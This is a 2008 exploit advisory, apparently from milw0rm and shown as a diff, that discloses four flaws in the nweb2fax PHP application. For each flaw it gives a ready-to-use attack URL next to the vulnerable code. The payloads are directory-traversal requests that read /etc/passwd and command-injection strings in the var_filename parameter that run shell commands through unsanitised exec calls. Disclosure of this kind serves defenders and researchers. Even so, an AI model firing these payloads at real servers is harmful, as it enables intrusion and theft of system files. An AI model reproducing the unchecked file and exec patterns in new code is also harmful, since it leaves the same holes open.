@@ -1,0 +1,95 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ##################################################################
+ #  [  nweb2fax <= 0.2.7   Multiple Remote Vulnerabilities  ]     #
+ ##################################################################
+ #
+ # Script site:  http://sourceforge.net/projects/nweb2fax/
+ # 
+ # [ Local File Inclusion Vulnerability ]:
+ #  *** /comm.php?id=../../../../../../../../../../etc/passwd
+ #
+ # Bug:
+ #
+ # ...
+ # $var_id=$_GET['id'];
+ # $fileary = file ( "$DIR_SPOOL/log/c$var_id" );
+ # reset($fileary);
+ # foreach ($fileary as $line) {
+ # 	if( trim($line) != "" ){
+ # 		print "<br>$line";
+ # 	}
+ # }
+ # ...
+ #
+ #
+ # [ Arbitrary File Download Vulnerability ]:
+ #
+*** /viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd
+ #
+ # Bug:
+ #
+ # ...
+ # $var_filename=$_GET['var_filename'];
+ # $var_format=$_GET['format'];
+ # ...
+ # if( $var_format == "ps" ) {
+ #   $filename = "$DIR_SPOOL/$var_filename";
+ #   header("Content-Type: application/postscript");
+ #   header('Content-Disposition: attachment;
+filename="downloaded.ps"');
+ #   readfile("$filename");
+ # ...
+ #
+ #
+ # [ Remote Command Execution 1]:
+ # *** /viewrq.php?format=tif&var_filename=;id%3E/tmp/id.txt;chmod%
+20777%20/tmp/id.txt;
+ #
+ # Bug:
+ # ...
+ # $var_filename=$_GET['var_filename'];
+ # $var_format=$_GET['format'];
+ # ...
+ # } elseif ($var_format == "pdf")  {
+ # ...
+ # $recvq_filename = "$DIR_SPOOL/$var_filename";
+ # ...
+ # exec("$PROG_TIFF2PS -a -O $FILE_TMP1 $recvq_filename",$exec_output,
+$exec_return);
+ # ...
+ # 
+ #
+ # [ Remote Command Execution 2]:
+ # *** /viewrq.php?format=pdf&var_filename=;id%3E/tmp/id2.txt;chmod%
+20777%20/tmp/id2.txt;id
+ #      
+ # Bug:
+ # ...
+ # $var_filename=$_GET['var_filename'];
+ # $var_format=$_GET['format'];
+ # ...
+ # } elseif ($var_format == "pdf")  {
+ # ...
+ # $recvq_filename = "$DIR_SPOOL/$var_filename";
+ # ...
+ #  $cmd="$PROG_CAT $recvq_filename | $PROG_GS $gs_options";
+ # ...
+ #  exec($cmd,$exec_output,$exec_return);
+ # ...
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * sid.psycho * str0ke and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+# milw0rm.com [2008-06-18]
